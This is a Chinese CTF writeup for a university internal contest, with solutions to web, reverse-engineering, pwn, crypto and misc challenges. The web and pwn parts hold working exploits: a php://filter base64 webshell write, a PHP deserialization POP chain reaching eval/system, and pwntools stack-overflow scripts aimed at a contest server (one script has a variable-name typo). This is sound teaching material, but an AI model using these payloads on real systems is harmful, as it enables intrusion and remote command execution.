---
title: WUST内部赛wp
tags: 
- CTF 
- Web
categories: 
- CTF
---



2019-2020-2-WUST第一次内部赛 Writeup

<!-- more -->

## Web

### 0x00 . 签到题

知识点：

**了解HTTP头部各部分的含义：**

**GET传参方式**

**POST传参方式**

**Referer伪造**

**IP伪造（XFF和Client-IP）**

下方是代码逻辑：

```
<?php
header('Content-type:text/html;charset=utf-8');
if(isset($_GET['ais'])){
	if($_GET['ais'] == 123){
		if(isset($_POST['ais'])){
			if ($_POST['ais'] == 123) {
				if(isset($_SERVER["HTTP_REFERER"])){
					if($_SERVER["HTTP_REFERER"]=="https://www.baidu.com"){
						if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])||isset($_SERVER['HTTP_CLIENT_IP'])){
							if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])&&$_SERVER['HTTP_X_FORWARDED_FOR']=="127.0.0.1"){
								die("你想干嘛！！！从本地访问，你伪造干嘛！！当真我不知道x-forwarded-for嘛！！！");
							}elseif($_SERVER['HTTP_CLIENT_IP']=="127.0.0.1"){
								echo "Oh my god....被你发现了！！";
								system('cat /flag');
							}

						}else{
							die("你需要从本地来访问我哦！！！");
						}
					}else{
						die("很接近了，但你从哪访问的我呀！！只有通过https://www.baidu.com才能访问我呀！！");
					}
				}else{
					die("你需要从百度页面来访问我！！！！");
				}
			}else{
				die("很接近了，很快就能拿到flag了！");
			}
		}else{
			die("用POST传一个名为ais的参数，令它的值等于123");
		}
	}else{
		die("很接近了，很快就能拿到flag了！");
	}
}else{
	die("用GET传一个名为ais的参数，令它的值等于123");
}
?>
```

Burpsuit抓包：发送到Repeater

<img src="https://s1.ax1x.com/2020/05/02/JvsEz8.png" />

更换请求方式：

1、GET方式传参

<img src="https://s1.ax1x.com/2020/05/02/Jvrf2T.png" />

2、POST方式传参

<img src="https://s1.ax1x.com/2020/05/02/Jvr5MF.png"/>

3、伪造Referer和IP

<img src="https://s1.ax1x.com/2020/05/02/JvrIr4.png" />

（这里ban掉了XFF）



### 0x01 . PHP是世界上最好的语言

知识点：

**服务器解析页面顺序**

**文件包含（php伪协议读取源码）**

**学习一下一句话木马及其原理**

**简单的代码审计（传马绕过死亡exit）**

apache下的配置文件httpd.conf，一般默认的是html，然后php

![JvrhxU.png](https://s1.ax1x.com/2020/05/02/JvrhxU.png)

根目录放了两个文件![JvrWGV.png](https://s1.ax1x.com/2020/05/02/JvrWGV.png)

所有会先是先是index.html

所以这里直接访问index.php



在index.php里面放了两个提示：（随便一个都可以往下走）

1、F12审计，有个URL:?file= 

2、抓包，在HTTP响应头部有个hint，base64解码得到：file include: /?file

所以，这里考察的是文件包含（页面使用的是PHP语言）

用到PHP伪协议读取源码：

[![JvroqJ.png](https://s1.ax1x.com/2020/05/02/JvroqJ.png)](https://imgchr.com/i/JvroqJ)

得到index.php经过base64后的源代码：

```
<!DOCTYPE html>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<head>
<title>å¦å¦å¦ï¼ä½ å¨è¿</title>
<style>
	div{
		float: left;
	}
</style>
</head>
<body>
<!--

	URL:/?file=

-->

<div id='left'><img src="bg.jpg" height="70%" width="70%"></div>
<div id='right'>
	<h1></h1>
	<h2></h2>
</div>
<?php //look:  upload.php
	header('hint: ZmlsZSBpbmNsdWRlOiAvP2ZpbGU=');
    $file = @$_GET['file'];
    if(isset($file)){
    include($file);
     }
     ?>
</body>
</html>
```

有个upload.php,通过同样的方法读取源码

[![Jvr7Z9.png](https://s1.ax1x.com/2020/05/02/Jvr7Z9.png)](https://imgchr.com/i/Jvr7Z9)

```
<?php
$exit="<?php exit; //I just want you to understand the principle ?>";
@$exit.=$_POST['death'];

@$filename = $_POST['filename'];


if(!isset($filename)){
   @file_put_contents($filename, "you should set something");
}

else{
   @file_put_contents($filename,$exit);

}
?> 
```

这里是一个简单的代码审计：

可以上传任意文件，并且可以往文件里面写任何东西，但存在一个限制（在每个文件头都加上了exit），这导致传入的可执行马不能运行，所以这里要绕过exit，让它不生效

（这里还是使用PHP伪协议，向文件写入代码）

可以参考一下P牛的这篇文章：（了解一下base64的原理）

https://www.leavesongs.com/PENETRATION/php-filter-magic.html

由于前面用了//注释了一些东西，要base64正确解码，就必须在payload前面多给3个字符，让他与前面的字符串组成的长度是4的倍数，然后后面传payload

payload:

death=aaaPD9waHAKZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOwo/Pg==&filename=php://filter/write=convert.base64-decode/resource=xxxxxx.php

这样传入的一句话木马就可以生效了，用蚁剑连上去，在服务器根目录发现flag

![JvrHaR.png](https://s1.ax1x.com/2020/05/02/JvrHaR.png)



### 0x02 . 你喜欢甜饼吗

知识点：

**逻辑漏洞（薅羊毛）**

**反序列化（魔术方法的利用）**

1、通过伪造Cookie拿到hint

抓包查看cookie，有个tag参数，base64解码一下：

[![JvrOG6.png](https://s1.ax1x.com/2020/05/02/JvrOG6.png)](https://imgchr.com/i/JvrOG6)

得到：user:guest,permission:false

页面提示是要admin才能访问，将guest改为admin，base64后传进去，发现页面提示没有权限，所以这里再改一下permission，改为true

user:admin,permission:true

base64一下覆盖tag后面的一串，拿到hint

[![JvrbI1.png](https://s1.ax1x.com/2020/05/02/JvrbI1.png)](https://imgchr.com/i/JvrbI1)

访问这个网站：然后F12看到这个提示：

![JvrLPx.png](https://s1.ax1x.com/2020/05/02/JvrLPx.png)

直接访问这个zip，下载得到源码：

```
<?php
/*
你居然找到了源码

惊不惊喜，意不意外

hint: flag在/flag

留下你的姓名。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
*/
header("Content-Type: text/html; charset=utf-8");

class Sea{
   public $d0y0uw4nt;

   function waoooo(){
         echo "<h1>你是否有过黑客梦！！！！！！！！</h1><br/>";
         echo $this;
         echo $this->d0y0uw4nt;
   }

   function __construct($shell){
         $this->d0y0uw4nt = $shell;
            }


   public function __toString(){
         unserialize($this->d0y0uw4nt);
         return "<h2>自闭的一天就要来了！！！！</h2>";

   }

}

class Cry{
        public $C;

        public $fl4g;

        public function halo(){
                echo "这么多代码，是不是不想看！！！！！！！！";
        }

        public function y0u_hacker(){
                //echo $this->fl4g;
                eval($this->fl4g);
        }

        function __destruct(){
                //echo "Cry类死了！";
                $this->C->s4y_l0v3();
        }


}
class Love{
        public $B;

        public function sea_said(){
                echo "愿你一生努力，一生被爱！！";
        }

        public function y0u_love(){
                echo "想要的都拥有，得不到的都释怀！！";
        }

        //s4y_l0v3明天再写

        function __call($method,$value){ //最终的利用方式
                $this->B->y0u_hacker();
        }
        function __destruct(){
                //echo "Love类死了！";
        }
}

@$wuhaha = $_POST['l0v3'];
$Sea = new Sea($wuhaha);
$Sea->waoooo();

```

这里考察了一下反序列化和魔术方法的利用：（简单POP链的构造）

找到Cry类中的y0u_hacker方法（因为存在eval函数），所以就从这里入手，看看能不能调用这个函数，并且fl4g参数可控；（大多安全问题都来源于输入与输出）



这里审计一下代码，发现Love类中的__call方法调用了y0u_hacker函数，那么就要想办法调用这个函数（关于\_\_call方法，当该对象调用的方法不存在的时候，就调用这个方法）



所以这里找到Cry的__destruct析构函数，如果这里将C变为Love对象，那么就会调用Love对象的\_\_call方法（因为Love对象没有s4y_l0v3这个函数）



那么到此，利用链就清楚了

```
<?php
class Cry{
        public $C;
        public $fl4g;
        public function halo(){
                echo "这么多代码，是不是不想看！！！！！！！！";
        }
        public function y0u_hacker(){
                //echo $this->fl4g;
                eval($this->fl4g);
        }
        function __destruct(){
                //echo "Cry类死了！";
                $this->C->s4y_l0v3();
        }
}
class Love{
        public $B;
        public function sea_said(){
                echo "愿你一生努力，一生被爱！！";
        }
        public function y0u_love(){
                echo "想要的都拥有，得不到的都释怀！！";
        }
        //s4y_l0v3明天再写
        function __call($method,$value){ //最终的利用方式
                $this->B->y0u_hacker();
        }
        function __destruct(){
                //echo "Love类死了！";
        }
}
$Cry_1 = new Cry();
$Cry_2 = new Cry(); //Love类的B参数对象
$Cry_2->fl4g = "system('cat /flag');";
//通过Cry_1对象的析构，调用s4y_l0v3方法
$Love_1 = new Love();
$Love_1->B = $Cry_2;
$Cry_1->C = $Love_1;
echo serialize($Cry_1);

//O:3:"Cry":2:{s:1:"C";O:4:"Love":1:{s:1:"B";O:3:"Cry":2:{s:1:"C";N;s:4:"fl4g";s:20:"system('cat /flag');";}}s:4:"fl4g";N;}
```



生成payload,POST传参，得到flag

![JvrjxO.png](https://s1.ax1x.com/2020/05/02/JvrjxO.png)



## RE

### 0x00.baby_re

出题人：0bs3rver

这题旨在让大家了解最基本的逆向。

顾名思义，很简单的一道re题，根据题目提示用ida打开并按下F5，可以得到一段main代码。

观察代码逻辑可得，该程序让你输入flag，通过check函数进行比对，并根据check函数的返回值判断flag是否正确。而点进check函数，可以看到该函数把你的输入进行运算，然后再与flag数组进行比对，一旦错误则返回0。

点进flag数组会是一大段数值，这时我们就可以知道，需要将这段值提取出来，通过逆向算法来get flag。

其中有几个细节需要注意，比如flag为int数组，而int在内存中是占四个字节的，在ida里面db，dw，dd分别代表1、2、4个字节，一些同学点进flag数组可能会很懵逼，不知道这都是啥玩意，真正的数据是什么。

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-1-1.png)

仔细观察可以发现只有第一个数据：350h前面的类型是dd，后面的都是db。

我们需要单击前面的类型，然后按下d，就可以方便的将类型转化为我们需要的dd，这样就能轻松的找到我们需要的信息。

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-1-2.png)

算法逆向很简单，这里就不多赘述了。

唯一需要注意的可能是这个地方。

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-1-3.png)

这行代码的原型是 a[i] = c1[i] << 3; ，这里char* 表示的是后面这个地址指向的是一个char类型的字符串，前面再带一个*是因为我们需要的是这个地址里面的值而不是这个地址，再前面的\*则是乘法符号。

附上源代码及解题脚本

```c
#include <stdio.h>

int check (char* c);

int flag[40] = {848,864,776,856,1016,688,808,792,392,424,792,696,384,920,920,920,920,920,920,920,920,920,792,696,840,872,896,864,808,1000};

int main(int argc, const char * argv[]) {
    char c[40] = "\0";
    printf("please input your flag:");
    scanf("%s",c);
    if(check(c))
        printf("Wow, your flag is right!\n");
    else
        printf("Maybe you need to try again~\n");
    return 0;
}

int check (char* c1){
    int a[40];
    for(int i=0; i<30; i++){
            a[i] = c1[i] << 3;
            a[i] += 0x10;
            a[i] ^= 0x10;
        }
    for(int i=0; i<30; i++){
        if(flag[i] != a[i])
            return 0;
    }
    return 1;
}

```

```python
num = [848,864,776,856,1016,688,808,792,392,424,792,696,384,920,920,920,920,920,920,920,920,920,792,696,840,872,896,864,808,1000]
flag = ''
for i in num:
	i ^= 0x10
	i -= 0x10
	flag += chr(i >> 3)

print(flag)
```

flag{Re_15_S0ooooooooo_Simple}



### 0x01.ez_py

出题人：0bs3rver

这题旨在让大家了解基本的py知识。

拿到题目可以看到是.pyc文件，百度可知这是.py文件编译后的产物，再次百度找到反编译网站，扔进去即可得到原py文件。

```python
def encode(message):
    flag = ''
    for i in message:
        x = ord(i) ^ 16
        x = x + 5
        flag += chr(x)
    return flag



message = 'qwLrfD;`JU`~"JY>pOJ_;J,OOJZypJw<ypJZqJ.;Oph'
```

这题甚至不用逆向，只需要加上一行 print(encode(message)) 即可

flag{Y0u_Jus7_N3ed_T0_Add_One_l1ne_Of_C0de}



## Pwn 

### 0x00 . just_run

​	登录Ubuntu，ctrl + alt +T打开终端。

​	输入命令：nc 121.41.113.245 10002

​	得到如下界面：

![JvrxMD.png](https://s1.ax1x.com/2020/05/02/JvrxMD.png)

​	然后啥也没有了。。。。

​	反汇编分析一下：

​	打开64位ida，将题目的附件(ELF文件)拖到ida中打开，默认选第一个，确定。

![JvsSqH.png](https://s1.ax1x.com/2020/05/02/JvsSqH.png)

​	左边是主要函数，我们双击main，按F5，得到反汇编的伪代码。

![JvsPII.png](https://s1.ax1x.com/2020/05/02/JvsPII.png)

![JvsCdA.png](https://s1.ax1x.com/2020/05/02/JvsCdA.png)

​	不管选择y还是n，都会直接执行system("/bin/sh");这行代码等同于在远程终端中执行“/bin/sh”。

​	因此执行该代码后，我们可以直接执行命令：cat flag.txt，得到flag。

![JvrXRK.png](https://s1.ax1x.com/2020/05/02/JvrXRK.png)

​	flag{294dbf32-54ea-4c2f-a0d3-e3221df75913}



### 0x01 . 2048

​	本题用到了[栈帧基础知识](https://segmentfault.com/a/1190000007977460)。

​	同上，执行nc 121.41.113.245 10000

![JvsARf.png](https://s1.ax1x.com/2020/05/02/JvsARf.png)

​	是个小游戏，要拿到10000分才能拿到flag。

​	用ida64反汇编附件，虽然函数有点多，不过发现如下关键代码：

```c++
while ( v7 <= 9999 )
  {
    getchar();
    switch ( (unsigned int)off_401B80 )
    {
      case 0x41u:
      case 0x61u:
        move_left_pre();
        rand_num();
        print_game();
        v7 = total;
        break;
      case 0x44u:
      case 0x64u:
        move_right_pre();
        rand_num();
        print_game();
        v7 = total;
        break;
      case 0x51u:
      case 0x71u:
        you_quit();
        return;
      case 0x53u:
      case 0x73u:
        move_down_pre();
        rand_num();
        print_game();
        v7 = total;
        break;
      case 0x57u:
      case 0x77u:
        move_up_pre();
        rand_num();
        print_game();
        v7 = total;
        break;
      default:
        goto LABEL_11;
    }
  }
  your_flag(v6);
```

​	也就是说，程序用v7变量记录分数，超过10000分就会退出循环，执行you_flag()函数。	

​	由前面代码可见，buf变量通过read函数读入，而且读取长度为0x200，所以可能发生溢出。

​	我们知道，函数中的局部变量都会存在栈上，如果read函数中对buf输入的长度过长，就会覆盖栈上的其他变量，比如说v7。

​	光标放在变量上:

[![JvsZQS.png](https://s1.ax1x.com/2020/05/02/JvsZQS.png)](https://imgchr.com/i/JvsZQS)

![Jvsesg.png](https://s1.ax1x.com/2020/05/02/Jvsesg.png)

​	发现两者距离栈底(即rbp)的偏移分别为：-0xF和-0x4。

​	也就是说，我们在buf中先输入11(0xF-0x4 = 0xB)个字节来填满数组，然后再输入10000，就会将v7变量修改成10000分。然后就能跳出游戏循环，执行you_flag()函数。

​	脚本如下，需要先额外安装一个python库，[pwntools](https://www.cnblogs.com/pcat/p/5451780.html)。

```python
from pwn import *							#使用pwntools库
p = remote("121.41.113.245",10000)				#远程连接
p.recvuntil("Well,R U a true player?[Y/N]")		
payload = "A"*0xB
payload += p64(10000)
p.sendline(payload)
p.interactive()
```

flag：flag{a1cbd38a-d468-440d-b623-6214aad97f68}



### 0x02 . joke

​	本题也用到了[栈帧基础知识](https://segmentfault.com/a/1190000007977460)。

​	丢ida64，程序流程还挺简单。

​	选1听笑话没p用😁😁😁。

[![JvsmLQ.png](https://s1.ax1x.com/2020/05/02/JvsmLQ.png)](https://imgchr.com/i/JvsmLQ)

​	漏洞在input函数，和2048一样，read函数存在溢出。

[![JvsuZj.png](https://s1.ax1x.com/2020/05/02/JvsuZj.png)](https://imgchr.com/i/JvsuZj)

​	而且程序中有一个mistake函数，从来没有用到过，而mistake函数执行了我们想要的system("/bin/sh")。

[![Jvs9Zd.png](https://s1.ax1x.com/2020/05/02/Jvs9Zd.png)](https://imgchr.com/i/Jvs9Zd)

​	而mistake的地址是:0x40089C。

[![JvsFit.png](https://s1.ax1x.com/2020/05/02/JvsFit.png)](https://imgchr.com/i/JvsFit)

​	可以考虑用上题相同的栈溢出和ROP，将input函数的返回地址改成mistake地址。

​	而后系统执行完input函数，发现栈上的返回地址被改成了mistake函数的地址，也就直接执行mistake函数了。

​	脚本如下：

```python
from pwn import *
p = remote('121.41.113.245',10001)
p.recvuntil("What do you say?")
payload='A'*0x30		#填充栈空间
payloda+=p64(0)			#填充旧的rbp(32位为ebp)
payload+=p64(0x40089C)	 #覆盖input函数返回地址
p.send(payload)
p.interactive()
```

flag：flag{3ae15963-fd5c-464c-ba30-299cc5a4e481}



## Crypto

### 0x00 . base64

​		提示为IMG，这题是base64转图片([在线工具](http://tool.chinaz.com/tools/imgtobase/))。

​		解得如下图片：

![JvskJP.png](https://s1.ax1x.com/2020/05/02/JvskJP.png)

​		题目中另外还有一个压缩包，而上述图片是解压密码。

​		解压后打开flag.txt，将字符串base64解码。

​		得到：flag{1s_my_p4ssword_t0o_5imple_?}



### 0x01 . 兔老大

提示就是Rabbit加密，密钥就是rabbit

解密过后，base32解码，拿到flag



### 0x02.easy_caesar

出题人：0bs3rver

根据题目及其描述可以看出利用了凯撒加密，但是给出的文档是一串大小写字母+符号的字符串，而凯撒加密是仅仅只有字母的。

可以联想到是不是在别的地方使用了移位，而最容易把这些东西串联起来的，就是ASCII码，在计算机中的字符一般都是使用ASCII码值进行存储，再联想到经典的凯撒加密算法是移动3位，所以可以写出解密脚本

```python
caesar = ']p{k]|X6TmI3MWL6f4<J\Zv}[3QkP6Qkfo<GP[Er][LoQ3T@'
flag = ''
for i in caesar:
	flag += chr(ord(i)-3)
	
print(flag)
```

但是解开并不是flag字符串，细细观察后面还有 = 符号，很容易联想到ctf中最常见的编码格式--base64，解密即可get flag。

flag{1t's_Fak3_Ca3sar_C1pher}



## Misc

### 0x00 . Where_am_I

​		这一题的灵感来自2019年10月24日菜鸟教程公众号，以及Nazo_game网站。

​		打开图片，下方提示了RGB，分别对应了度分秒，而且north和west也比较明确的提示了，这题和地理经纬度有关。

- 登录pc端QQ，ctrl + alt + A，光标放在两个色块上即可知道north对应色块rgb为（40,41,21），west的rgb为（74,2,40）。

  ![Jvrzse.png](https://s1.ax1x.com/2020/05/02/Jvrzse.png)

- 跟方向对应起来就是40°41′21″N 74°02′40″W。

- 上Google Earth搜索(注意[搜索语法](https://support.google.com/maps/answer/18539?co=GENIE.Platform%3DDesktop&hl=zh-Hans))，得到位置为自由女神像。

​		得到：flag{statue_of_liberty}



### 0x01 . 古老的计算机

将图片放到winhex中，可以发现图片最下方存在很多.... ..

根据题目古老的计算机，联想到2进制

将....转换成1，..转换成0

然后将二进制转换成字符串，拿到flag



### 0x02.double_flag

出题人：0bs3rver

这题下载下来是一个zip文件，但是解压会报错，我们可以联想到是不是文件出了什么问题（当然不是出题人弄错了...），用十六进制打开文件查看，发现前面少了zip头 504B0304 ，添加进去即可打开文件。

打开后是两张图片，可以看到第二张图片和第一张一样但是有很明显的修改痕迹，可以联想到是修改了十六进制下的内容。搜索 flag或者是一一对比可以发现第一处不同在0x400，第二次不同在0x800，第三次在0x1000，很明显是个数列，同时第一次以后的不同就是竖向排列了（这里这样设置是为了让肉眼寻找的同学有一线生机...），即可得到flag。

同时更推荐的方法是用工具进行对比，例如Beyond Compare，可以方便的对比各种文件，这里用十六进制比较打开两张图片，即可轻松get flag。

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-1-4.png)

flag{1t's_Imp0rtan7_To_Pr0t3ct_Your_Eye5}